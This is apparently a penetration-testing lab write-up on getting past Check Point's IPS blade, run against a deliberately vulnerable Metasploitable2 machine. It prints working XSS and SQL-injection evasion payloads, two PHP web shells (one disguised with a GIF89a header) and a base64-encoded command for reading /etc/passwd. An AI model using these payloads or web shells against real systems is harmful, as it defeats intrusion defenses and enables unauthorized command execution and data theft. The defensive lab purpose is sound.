---
title: Bypass IPS in Check Point Firewall
tags: [IPS, Check point Firewall]
style: gray
color: info
description: TBypass IPS in Check Point Firewall
---
### What is **Intrusion Prevention System (IPS)**

Intrusion Prevention Systems detect or prevent attempts to exploit weaknesses in vulnerable systems or applications, protecting you in the race to exploit the latest breaking threat. Check Point IPS protections in our Next Generation Firewall are updated automatically. Whether the vulnerability was released years ago, or a few minutes ago, your organization is protected.[[source](https://www.checkpoint.com/quantum/intrusion-prevention-system-ips/)]

In simple words IPS try to detect and prevent any attempts to exploit your system or your application.

In this lab I will try to bypass IPS blade.

### Lab Requirements

1. kali Linux as attacker
2. metsploitable2 as vulnerable machine
3. Check Point Firewall R80.40

## Without IPS Blade

lets start without enabling the IPs blade and see what we can attack and exploit.

![Untitled](https://www.notion.so/Bypass-IPS-in-Check-Point-Firewall-de5e16062aae49d6b2f3aba95c85823e#82cea71d8e1646628cdc7a33f0223e69)

From Kali Linux let’s perform some common attacks like XSS, SQLi, and upload files.

#### - Reflected XSS

simple payload

```jsx
<script>alert('CyberY')</script>
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/50dd3d31-c624-43e0-bdc7-9826590b6aa0/Untitled.png)

As we can see payload successfully executed.

#### - SQL Injection

simple payload

```sql
1' or 1--
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/797913ec-25c9-47cd-91ce-f935b90e3cca/Untitled.png)

we can retrieve all the users simply.

#### - File Upload

lets upload simple backdoor

```php                          
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/66968fd8-37ff-422d-aef1-c7f618da3783/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/abfdc2e2-dd59-4a9a-9a4b-fdc470afb66b/Untitled.png)

got a remote code execution.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9cd4e3b1-34a0-414b-9460-9c4837392450/Untitled.png)

## Enable IPS Blade

1. In check point firewall double click on the firewall name.
2. In Threat Prevention select IPS.
3. Click OK.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f3e0107a-d4b1-4082-a7a6-e86d09a471f4/Untitled.png)

you should see IPS blade enabled.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c156bcd3-de43-448e-b03d-51a1c826e43f/Untitled.png)

1. Click on Security Policies in the left side.
2. Under Threat Prevention select Policy.
3. Right click under Action and select Strict.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/507da690-4d03-4ba2-b52e-c1a5daeccda7/Untitled.png)

7.Publish and install the policies.

Lets try to exploit and see the behavior.

## Exploitation

#### - XSS reflected

with same payload failed.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b33740a9-eeb9-41d7-ba6d-846d3dc42cdd/Untitled.png)

#### - SQL Injection

with same payload failed.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1088ee9c-09cf-4c09-8524-e50f777de7cd/Untitled.png)

#### - File Upload

failed.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/36627d7f-cf61-482d-8bbd-404611bc95a1/Untitled.png)

##### This meaning the IPS working great.

Check the logs in the firewall.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/63a249bb-a6f9-4768-a212-9dbeb1fbe6e6/Untitled.png)

you can double click and see the details 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ef556d7c-df4e-4e68-8bf2-73d9b18763b4/Untitled.png)

## Bypass IPS in Check Point Firewall

After we see the behavior of the IPS lets bypass it.

to bypass it we have to know how IPS identification works for this I suggest to watch the below video.

[https://www.youtube.com/watch?v=hEgWPWIuq_s&ab_channel=ProfessorMesser](https://www.youtube.com/watch?v=hEgWPWIuq_s&ab_channel=ProfessorMesser)

Now we are ready to go, to make this easy we can take help from [PayloadALLThings](https://github.com/swisskyrepo/PayloadsAllTheThings) in github.

[GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings)

#### - XSS reflected

The only obstacle to bypass the IPS is to find action upon the
error. alert(), prompt(), confirm(), and eval() were all blocked, so we would have to look for other alternatives to create a proof of concept to show the existence of cross-site scripting vulnerabilities.

```jsx
1'"><img/src/onerror=.1|alert`CyberY`>
```

By this payload we are able to bypass IPS and preform reflected XSS.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3c1c24dc-6907-4c7f-b6ac-e4e0f814a851/Untitled.png)

#### - SQL Injection

After long search I bypass it by replacing the space with **/*! */** as following payload [[source](https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli)]

```sql
1'/*! */or/*! */'1/*! */--/*! */
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c8dfc4a0-732e-4dcc-8831-50e27dd891e5/Untitled.png)

#### - File Upload

After some attempts I got to know that the IPS check the content type, to bypass this we can put **GIF89a;** header.

The payload is 

```php
GIF89a;
<?
system($_GET['cmd']); # shellcode goes here
?>
```

Uploaded with php extension means the IPS never check the extension of the file. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a72351e2-62e4-40ee-bc54-710676291a8a/Untitled.png)

navigate to the url, then type ?cmd=whoami

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed374d8b-b62b-4e9d-aa55-b819f8183013/Untitled.png)

another interesting thing that IPS block me from doing cat /etc/passwd

To bypass it I encoded the command as following

```bash
echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash
```

and here we go 😀

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4e4e7fd-e1a0-4b9f-be26-03135754f17b/Untitled.png)

### Thanks for reading, hope you enjoyed.